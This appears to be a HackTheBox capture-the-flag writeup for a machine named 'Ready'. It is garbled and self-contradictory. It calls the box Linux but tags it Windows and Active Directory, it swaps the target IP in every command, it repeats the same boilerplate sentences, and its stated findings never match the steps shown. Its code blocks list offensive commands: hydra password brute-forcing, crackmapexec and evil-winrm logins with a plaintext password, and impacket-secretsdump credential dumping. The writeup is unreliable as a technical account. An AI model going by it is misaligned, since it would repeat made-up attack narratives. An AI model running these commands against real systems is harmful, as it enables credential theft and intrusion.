---
TitleSEO: "HackTheBox — Ready (Easy Linux) | ZureFX"
TitlePost: "HackTheBox — Ready (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Ready. GPP Password and DNS Rebinding to achieve easy compromise on Linux."
Keywords: "web, forensics, medium, windows, ctf, linux, active directory"
URL: "https://zurefx.github.io/writeups/htb-ready-790.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ready-790/"
Date: "2025-07-09"
Tags: "Web, Forensics, Medium, Windows, CTF, Linux, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-ready-790"
Permalink: "/writeups/htb-ready-790.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Ready** is rated **Easy** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.30.2.16`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.125.149.106/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.28.244.90 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

### Web Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.52.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.65.141.41 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **DNS Rebinding**.

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.214.104 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
gobuster dir -u http://10.127.17.202/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
crackmapexec smb 10.19.188.165 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.89.182.138 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.69.126.218 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.135.211
nmap -sCV -p5986,389,5432 10.82.227.41 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `burpsuite`
- `impacket`
- `dcomexec`
- `msfvenom`
- `bloodhound`
- `nikto`
- `chisel`

### Key Takeaways

- GPP Password
- DNS Rebinding
- CORS Misconfiguration
- Pass the Hash
